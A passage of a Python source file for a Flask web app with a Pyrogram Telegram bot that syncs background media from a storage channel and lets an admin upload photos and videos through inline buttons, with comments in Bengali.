    if is_chat_backup_message(message) or not message_is_background_media(message):
        return False

    BG_DIR.mkdir(parents=True, exist_ok=True)

    media_obj = (
        getattr(message, "video", None)
        or getattr(message, "animation", None)
        or getattr(message, "document", None)
    )

    original_name = getattr(media_obj, "file_name", None) if media_obj else None

    if getattr(message, "photo", None):
        original_name = original_name or f"photo_{message.id}.jpg"
    elif getattr(message, "animation", None):
        original_name = original_name or f"animation_{message.id}.gif"
    elif getattr(message, "video", None):
        original_name = original_name or f"video_{message.id}.mp4"
    else:
        original_name = original_name or f"media_{message.id}"

    safe_name = secure_filename(os.path.basename(original_name)) or f"media_{message.id}"
    if not Path(safe_name).suffix:
        if getattr(message, "photo", None):
            safe_name += ".jpg"
        elif getattr(message, "animation", None):
            safe_name += ".gif"
        else:
            safe_name += ".mp4"

    target = BG_DIR / f"{secure_filename(prefix)}_{message.id}_{safe_name}"

    if target.is_file():
        return False

    try:
        downloaded = await client.download_media(message, file_name=str(target))
        return bool(downloaded)
    except Exception as exc:
        print("Pyrogram background download error:", exc)
        return False


async def scan_storage_channel(client, limit=100):
    synced_count = 0

    async for message in client.get_chat_history(STORAGE_CHANNEL_ID, limit=limit):
        try:
            if await download_background_message(client, message, "channel"):
                synced_count += 1
        except Exception:
            print("Channel scan item error:", traceback.format_exc())

    return synced_count


async def start_pyrogram_monitor():
    global pyrogram_client

    if Client is None or filters is None:
        print("Pyrogram is not installed; background channel sync is disabled.")
        return False

    if not BOT_TOKEN or not API_ID or not API_HASH:
        print("API_ID/API_HASH/BOT_TOKEN missing; Pyrogram background sync is disabled.")
        return False

    client = Client(
        "bg_channel_monitor_session",
        api_id=API_ID,
        api_hash=API_HASH,
        bot_token=BOT_TOKEN,
        in_memory=True,
    )

    @client.on_message(filters.chat(STORAGE_CHANNEL_ID))
    async def handle_channel_upload(_client, message):
        try:
            if is_chat_backup_message(message):
                return
            await download_background_message(_client, message, "channel")
        except Exception:
            print("Channel monitor error:", traceback.format_exc())

    # --- নতুন বট আপলোড ফিচার (ফটো এবং ভিডিও একসাথে, Admin-only) ---
    @client.on_message(filters.command("start") & filters.private)
    async def start_cmd(client, message):
        if message.from_user.id != ADMIN_ID:
            await message.reply("⛔ You are not authorized to use this bot.")
            return
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📤 Upload Media (Photo/Video)", callback_data="start_upload")]
        ])
        await message.reply(
            "👋 Welcome Admin!\n\nClick the button below to upload media. You can send a photo, a video, or multiple media files grouped together to upload them to your storage channel and website.",
            reply_markup=keyboard
        )

    @client.on_callback_query(filters.regex("start_upload"))
    async def start_upload_callback(client, callback_query):
        if callback_query.from_user.id != ADMIN_ID:
            await callback_query.answer("Unauthorized!", show_alert=True)
            return
        
        # পূর্বের কোনো আপলোড স্টেট থাকলে ক্লিয়ার করে নতুন করে শুরু করা
        pending_uploads[ADMIN_ID] = {"waiting_for_media": True, "media_group": []}
        
        await callback_query.message.edit_text(
            "📥 Please send the photo(s) and/or video(s) now.\n\n"
            "You can send a single file or an album (multiple files at once)."
        )
        await callback_query.answer()

    @client.on_message(filters.private & (filters.photo | filters.video | filters.document))
    async def handle_media_upload(client, message):
        if message.from_user.id != ADMIN_ID:
            return
        
        user_state = pending_uploads.get(ADMIN_ID, {})
        if not user_state.get("waiting_for_media"):
            return

        # যদি অ্যালবামের অংশ হয়, তাহলে media_group_id ব্যবহার করে সব মেসেজ লিস্টে রাখব
        if message.media_group_id:
            if "media_group" not in user_state:
                user_state["media_group"] = []
            
            # মেসেজটি গ্রুপে যোগ করা হচ্ছে
            user_state["media_group"].append(message)
            pending_uploads[ADMIN_ID] = user_state
            
            # অ্যালবামের অন্যান্য মেসেজ রিসিভ করার জন্য একটু অপেক্ষা করা যেতে পারে (ঐচ্ছিক)
            # এখানে আমরা প্রতিটি মেসেজ রিসিভ হওয়ার পর কনফার্মেশন বাটনের আপডেট দিব
            text = f"👍 Grouped media received ({len(user_state['media_group'])} items). Send more or click confirm."
        else:
            # সিঙ্গল মেসেজ হলে সরাসরি লিস্টে রাখা
            user_state["media_group"] = [message]
            pending_uploads[ADMIN_ID] = user_state
            text = "👍 Media received! Send more files or click below to publish."

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Confirm & Upload", callback_data="confirm_upload")]
        ])
        
        # ইউজারকে জানানো হচ্ছে যে ফাইল পাওয়া গেছে
        await message.reply(text, reply_markup=keyboard)

    @client.on_callback_query(filters.regex("confirm_upload"))
    async def confirm_upload_callback(client, callback_query):
        if callback_query.from_user.id != ADMIN_ID:
            return
        
        state = pending_uploads.get(ADMIN_ID, {})
        media_list = state.get("media_group", [])

        if not media_list:
            await callback_query.answer("No media found to upload!", show_alert=True)
            return

        await callback_query.message.edit_text("⏳ Uploading to channel... Please wait.")

        try:
            # যদি একাধিক মিডিয়া থাকে তবে MediaGroup হিসেবে পাঠাবো, যাতে তারা একসাথে পাশাপাশি থাকে
            if len(media_list) > 1:
                media_group = []
                for msg in media_list:
                    if msg.photo:
                        media_group.append(InputMediaPhoto(msg.photo.file_id, caption=msg.caption))
                    elif msg.video:
                        media_group.append(InputMediaVideo(msg.video.file_id, caption=msg.caption))
                    elif msg.document:
                        # ডকুমেন্ট হ্যান্ডলিং (প্রয়োজন হলে)
                        pass
                
                if media_group:
                    await client.send_media_group(chat_id=STORAGE_CHANNEL_ID, media=media_group)
            else:
                # সিঙ্গল মিডিয়া হলে সরাসরি ফরোয়ার্ড/কপি
                await media_list[0].copy(STORAGE_CHANNEL_ID)

            # আপলোড সম্পন্ন হলে মেমোরি থেকে ক্লিয়ার করা
            pending_uploads.pop(ADMIN_ID, None)
            
            await callback_query.message.edit_text(
                f"🎉 Successfully published {len(media_list)} file(s) to the Telegram channel and synced with the website!"
            )
        except Exception as e:
            await callback_query.message.edit_text(f"❌ Upload failed: {str(e)}")
        
        await callback_query.answer()

    @client.on_message(filters.command("uploadDone") & filters.private)
    async def upload_done_cmd(client, message):
        if message.from_user.id != ADMIN_ID:
            return
        
        state = pending_uploads.get(ADMIN_ID, {})
        media_list = state.get("media_group", [])

        if not media_list:
            await message.reply("⚠️ No pending media found. Please send media first by typing /start")
            return

        try:
            if len(media_list) > 1:
                media_group = []
                for msg in media_list:
                    if msg.photo:
                        media_group.append(InputMediaPhoto(msg.photo.file_id, caption=msg.caption))
                    elif msg.video:
                        media_group.append(InputMediaVideo(msg.video.file_id, caption=msg.caption))
                
                if media_group:
                    await client.send_media_group(chat_id=STORAGE_CHANNEL_ID, media=media_group)
            else:
                await media_list[0].copy(STORAGE_CHANNEL_ID)

            pending_uploads.pop(ADMIN_ID, None)
            await message.reply(f"🎉 Successfully published {len(media_list)} file(s) to the Telegram channel and website!")
        except Exception as e:
            await message.reply(f"❌ Upload failed: {str(e)}")
    # ----------------------------------------

    try:
        await client.start()
        pyrogram_client = client
        print("Pyrogram storage-channel monitor & bot uploader started.")

        async def initial_scan():
            try:
                count = await scan_storage_channel(client, limit=100)
                print(f"Initial background sync completed: {count} new files.")
            except Exception:
                print("Initial channel scan error:", traceback.format_exc())

        asyncio.create_task(initial_scan())
        return True

    except Exception:
        print("Pyrogram startup error:", traceback.format_exc())
        pyrogram_client = None
        return False


def pyrogram_scan_channel_sync():
    if pyrogram_client is None:
        return 0

    try:
        return int(run_async(scan_storage_channel(pyrogram_client, limit=100), timeout=300))
    except Exception:
        print("Pyrogram scan error:", traceback.format_exc())
        return 0


# ============================================================
# Start optional Pyrogram monitor
# ============================================================

def start_background_services():
    if Client is None or not BOT_TOKEN or not API_ID or not API_HASH:
        print(
            "Pyrogram monitor not started. Chat-to-Telegram storage uses the Bot API; "
            "set API_ID and API_HASH only if background channel sync is needed."
        )
        return

    if not pyrogram_thread.is_alive():
        pyrogram_thread.start()

    if not pyrogram_loop_ready.wait(timeout=5):
        print("Pyrogram loop did not become ready.")
        return

    try:
        run_async(start_pyrogram_monitor(), timeout=45)
    except Exception:
        print("Could not start Pyrogram monitor:", traceback.format_exc())


start_background_services()


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "8080"))
    app.run(host="0.0.0.0", port=port, threaded=True, debug=False)
